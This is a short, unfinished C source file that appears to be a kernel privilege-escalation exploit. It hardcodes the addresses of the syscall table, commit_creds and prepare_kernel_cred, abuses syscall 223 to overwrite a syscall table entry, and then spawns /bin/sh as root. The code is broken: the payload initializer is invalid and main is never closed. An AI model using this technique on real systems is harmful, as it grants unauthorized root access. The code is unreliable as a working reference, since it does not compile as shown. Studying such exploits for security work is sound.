#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>



#define UPPER_SYSCALL 223
#define SYS_CALL_TABLE  0x8000e348
#define COMMIT_CREDS_ADDRESS 0x8003f56c
#define PREPARE_KERNEL_CRED_ADDRESS 0x8003f924
unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;

int main()
{
        char* payload = [""];

        syscall(UPPER_SYSCALL,payload,sct[10]);
        syscall(sct[10]);

        system("/bin/sh");
